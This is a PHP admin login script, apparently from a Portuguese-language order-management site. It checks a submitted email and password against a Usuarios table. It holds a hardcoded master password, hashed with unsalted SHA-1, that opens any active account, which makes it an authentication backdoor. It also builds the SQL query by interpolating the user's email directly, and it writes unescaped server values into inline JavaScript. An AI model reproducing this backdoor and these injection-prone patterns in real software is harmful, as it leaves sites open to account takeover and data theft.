<?php
if($s->tipoAdm==3||$s->tipoAdm==2)$s->locAdmin('.');
$s->ijs = array("
var _xm = '".$x->m."';
var _xl = '".$x->l."';
if(_xm)alert(_xm);
if(_xl)window.location = _xl;
",
"
function ver(f){
}
");

if(isset($_POST['user'])){
	$user = strtoupper(strps('user'));
	$senha = strpr('pass');
	$pass = sha1($senha);
	$master = sha1('tresMosqueteiros');
	$referer = strpr('referer');

	$User = $b->query("select * from Usuarios where email='$user' and id_perfil!=4 limit 1");

	if($User->rowCount())$rs = $User->fetchObject();

	if(!$user)$x->m = 'Digite o e-mail!';
	elseif(!$pass)$x->m = 'Digite a senha!';
	elseif($rs){
		if($rs->status!=1)$x->m = 'Usuário desativado pelo Administrador!';
		elseif($rs->senha==$pass||$master==$pass){
			$s->idu = $_SESSION['idu'] = $rs->id_usuario+0;
			$s->nomeAdm = $_SESSION['nomeAdm'] = $rs->nome;
			$s->userAdm = $_SESSION['userAdm'] = $rs->email;
			$s->tipoAdm = $_SESSION['tipoAdm'] = $rs->id_perfil+0;
			$s->timeoutAdm = $_SESSION['timeoutAdm'] = time();
			if($referer&&$referer=explode("_",$referer))$s->locAdmin($referer[0].($referer[1]?'/'.$referer[1]:''));
			else $s->locAdmin('pedidos');
		}else $x->m = 'Senha inválida!';
		
	}else $x->m = 'Usuário inexistente!';
}